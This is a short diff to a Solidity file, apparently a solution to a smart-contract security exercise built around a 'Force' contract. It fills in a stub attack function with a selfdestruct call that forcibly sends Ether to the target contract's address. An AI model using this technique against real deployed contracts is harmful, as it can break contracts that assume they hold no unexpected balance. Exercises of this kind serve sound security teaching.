@@ -1,4 +1,3 @@
-// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.9;
 import "./Force.sol";
 
@@ -9,7 +8,7 @@ contract AttackingForce {
         contractAddress = _contractAddress;
     }
 
-    function hackContract() external {
-        // Code me!
+    function hackContract() public payable {
+        selfdestruct(payable(contractAddress));
     }
 }
